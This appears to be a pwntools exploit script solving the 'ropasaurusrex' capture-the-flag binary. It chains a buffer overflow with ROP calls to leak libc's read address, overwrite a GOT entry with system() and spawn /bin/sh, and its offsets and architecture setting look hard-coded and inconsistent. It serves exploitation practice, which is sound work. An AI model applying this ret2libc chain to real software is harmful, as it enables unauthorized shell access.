

from pwn import *

## Helping...
#context(terminal=['tmux','new-window'])
#p = gdb.debug('./ropasaurusrex-', 'b main')
p = process('./ropasaurusrex-')
context(os='linux',arch='amd64')
#context.log_level = 'DEBUG'
##context.log_level = 'error'
##context.log_level = 'info'

## Address
read_plt = p32(0x0804832c)
#read_plt_got = p32(0x804961c) first 
read_plt_got = p32(0x08048416)

write_plt = p32(0x0804830c)
##ret_addr = 0x41414141
ret_addr = p32(0x080484b6)
dynamic = p32(0x08049530)


##### this is payload for lack address in glibc
####
payload = "A"*140 
payload += write_plt
payload += ret_addr
#payload += "BBBB"
payload += p32(1)
payload += read_plt_got
payload += p32(4)
raw_input() ## for handeing crashing

####### this is 1.5 stage payload... hahahah

### save bin/sh
## read
payload += read_plt
payload += ret_addr
#payload += "BBBB"
payload += p32(0)
payload += dynamic
payload += p32(7)

## read write in GOT
payload += read_plt
payload += ret_addr
payload += p32(0)
payload += read_plt_got
payload += p32(4)

## write 
payload += write_plt
payload += ret_addr
payload += dynamic



p.send(payload)
raw_input('chack drr firts payload')
lack_read = p.recv()
lack_read = u32(lack_read)

#print(hex(lack_read))
log.success("lack read@Glibc:" + hex(lack_read))

read_sys = 0xd5b00
sys_libc = 0x3ada0

glibc_system = lack_read - 0xd5b00 + 0x3ada0
log.info('Glibc System Address' + hex(glibc_system))
p.send('/bin/sh')
p.send(p32(glibc_system))



#offset = lack_read - read_sys

## print(hex(offset))
#system_got = offset + sys_libc
#log.success("System Address in Glibc: " + hex(system_got))
#print(hex(u32(lack_read)))
#lack_read = u32(lack_read)
#p.send("/bin/sh")
#p.send(p32(system_got))


p.interactive()